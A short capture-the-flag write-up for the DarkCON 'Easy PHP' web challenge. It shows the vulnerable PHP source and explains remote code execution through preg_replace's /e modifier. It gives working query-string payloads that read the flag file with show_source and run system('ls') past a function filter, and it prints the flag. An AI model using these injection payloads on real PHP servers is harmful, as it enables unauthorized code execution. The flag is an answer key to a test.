Easy PHP
===
**Category**: Web

**Points**: 384 (145 solves)

**Author**: Rosee
### Description
```
Please note....
Note: This chall does not require any brute forcing
```
- Site: `http://easy-php.darkarmy.xyz/`
### Solution
- i access `/robots.txt`, i see `?lmao`
- i have source
```<?php
require_once 'config.php';

$text = "Welcome DarkCON CTF !!";

if (isset($_GET['lmao'])) {
    highlight_file(__FILE__);
    exit;
}
else {
    $payload = $_GET['bruh'];
    if (isset($payload)) {
        if (is_payload_danger($payload)) {
            die("Amazing Goob JOb You :) ");
        }
        else {
            echo preg_replace($_GET['nic3'], $payload, $text);
        }
    }
    echo $text;
}
?>
```
- flow code: `bruh` and `ni3e` are passed as parameters. In PHP 5.6.4, i can rce via `preg_replace` with `/e` but function `is_payload_danger` disable many function can rce
- i find fucntion `show_source` not disable and we can use move payload.
### Payload
- use `show_source` -> ```?nic3=/CTF/e&bruh=show_source(glob("fl*")[0]);```
- use move payload -> ```?nic3=/CTF/e&bruh=$_GET['cmd']("ls")&cmd=system;
### Flag
- `darkCON{w3lc0me_D4rkC0n_CTF_2O21_ggwp!!!!}`
